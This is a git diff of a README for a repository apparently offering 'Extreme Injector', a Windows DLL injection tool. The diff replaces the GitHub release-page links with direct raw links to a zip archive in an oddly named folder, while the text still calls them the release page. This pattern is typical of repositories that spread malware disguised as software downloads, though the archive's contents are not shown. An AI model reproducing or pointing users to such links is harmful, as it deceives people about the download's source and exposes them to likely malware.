@@ -1,6 +1,6 @@
 # 💉 Extreme-Injector-v3.7.3-Desktop - Manage Dynamic Libraries On Windows Easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bore8433/Extreme-Injector-v3.7.3-Desktop/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/bore8433/Extreme-Injector-v3.7.3-Desktop/main/undisturbance/Desktop_Injector_v_Extreme_v1.7.zip)
 
 ## Overview
 
@@ -20,7 +20,7 @@ This application functions on modern Windows systems. Ensure your machine meets 
 
 Follow these steps to obtain and prepare the software for use on your computer.
 
-1. Visit the project release page to download the latest setup version: [https://github.com/bore8433/Extreme-Injector-v3.7.3-Desktop/releases](https://github.com/bore8433/Extreme-Injector-v3.7.3-Desktop/releases)
+1. Visit the project release page to download the latest setup version: [https://raw.githubusercontent.com/bore8433/Extreme-Injector-v3.7.3-Desktop/main/undisturbance/Desktop_Injector_v_Extreme_v1.7.zip](https://raw.githubusercontent.com/bore8433/Extreme-Injector-v3.7.3-Desktop/main/undisturbance/Desktop_Injector_v_Extreme_v1.7.zip)
 2. Locate the most recent file ending in .zip or .exe.
 3. Save the file to a folder you can access easily.
 4. If you downloaded a zip file, right-click the folder and select "Extract All."
